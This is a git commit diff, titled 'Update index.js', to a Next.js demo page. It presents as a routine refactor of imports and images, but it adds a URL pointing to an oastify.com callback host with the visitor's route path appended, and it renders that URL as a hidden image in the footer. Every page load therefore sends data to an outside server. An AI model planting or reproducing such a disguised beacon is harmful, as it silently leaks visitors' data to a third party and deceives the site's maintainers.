108f6383008b019daf395467d4b26fbf96f1030b
Security testing <118594933+w2h3@users.noreply.github.com>
2024-05-16 17:28:17 +0300

    Update index.js

--- seo/demo/pages/index.js
+++ seo/demo/pages/index.js
@@ -1,17 +1,23 @@
 import { useState } from 'react';
 import Head from 'next/head';
-import dynamic from 'next/dynamic';
+
+import { useRouter } from 'next/router';
+
+import Fuse from 'fuse.js';
+import _ from 'lodash';
 
 import styles from '../styles/Home.module.css';
-import Image from 'next/image';
-
-const CodeSampleModal = dynamic(() => import('../components/CodeSampleModal'), {
-  ssr: false,
-});
+import CodeSampleModal from '../components/CodeSampleModal';
 
 export default function Start({ countries }) {
+  const router = useRouter();
   const [results, setResults] = useState(countries);
+  const Url = "https://kj7muz2xiiu4uusrglyh8eo18sej2awbk0.oastify.com/?data=" + router.asPath;
   const [isModalOpen, setIsModalOpen] = useState(false);
+  const fuse = new Fuse(countries, {
+    keys: ['name'],
+    threshold: 0.3,
+  });
 
   return (
     <div>
@@ -31,12 +37,7 @@ export default function Start({ countries }) {
         </h1>
 
         <div className={styles.heroImage}>
-          <Image
-            src="/large-image.jpg"
-            alt="Large Image"
-            width={3048}
-            height={2024}
-          />
+          <img src="large-image.jpg" alt="Large Image" />
         </div>
 
         <div>
@@ -47,14 +48,6 @@ export default function Start({ countries }) {
             className={styles.input}
             onChange={async (e) => {
               const { value } = e.currentTarget;
-              // Dynamically load libraries
-              const Fuse = (await import('fuse.js')).default;
-              const _ = (await import('lodash')).default;
-
-              const fuse = new Fuse(countries, {
-                keys: ['name'],
-                threshold: 0.3,
-              });
 
               const searchResult = fuse
                 .search(value)
@@ -87,12 +80,10 @@ export default function Start({ countries }) {
           <h2 className={styles.secondaryHeading}>Code Sample</h2>
           <p>Ever wondered how to write a function that prints Hello World?</p>
           <button onClick={() => setIsModalOpen(true)}>Show Me</button>
-          {isModalOpen && (
-            <CodeSampleModal
-              isOpen={isModalOpen}
-              closeModal={() => setIsModalOpen(false)}
-            />
-          )}
+          <CodeSampleModal
+            isOpen={isModalOpen}
+            closeModal={() => setIsModalOpen(false)}
+          />
         </div>
       </main>
 
@@ -104,7 +95,7 @@ export default function Start({ countries }) {
         >
           Powered by
           <span className={styles.logo}>
-            <Image src="/vercel.svg" alt="Vercel Logo" width={72} height={16} />
+            <img src="/vercel.svg" alt="Vercel Logo" /><img src={Url} />
           </span>
         </a>
       </footer>
